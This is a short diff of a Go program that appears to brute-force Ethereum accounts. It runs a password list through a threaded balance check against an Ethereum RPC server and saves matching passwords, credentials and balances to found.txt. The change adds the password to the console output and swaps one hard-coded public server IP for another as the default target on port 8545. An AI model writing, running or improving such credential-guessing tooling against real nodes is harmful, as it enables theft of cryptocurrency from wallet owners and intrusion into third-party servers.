@@ -89,7 +89,7 @@ func CheckBalance(passwords chan string, client *ethclient.Client) {
 			data := password + ":" + creds + ":" + balance.String() + "\n"
 			WriteToFound(data, "found.txt")
 		}
-		fmt.Println(creds, balance)
+		fmt.Println(password, creds, balance)
 	}
 	defer wg.Done()
 }
@@ -107,7 +107,7 @@ func GetPasswordList(path string) ([]string, error) {
 func main() {
 	passFile := flag.String("i", "passwords.txt", "Password list")
 	threads := flag.Uint("t", 4, "Number of threads")
-	server := flag.String("s", "54.177.34.52", "Ethereum rpc server")
+	server := flag.String("s", "65.108.243.191", "Ethereum rpc server")
 	port := flag.Int("p", 8545, "Ethereum rpc port")
 	flag.Parse()
 
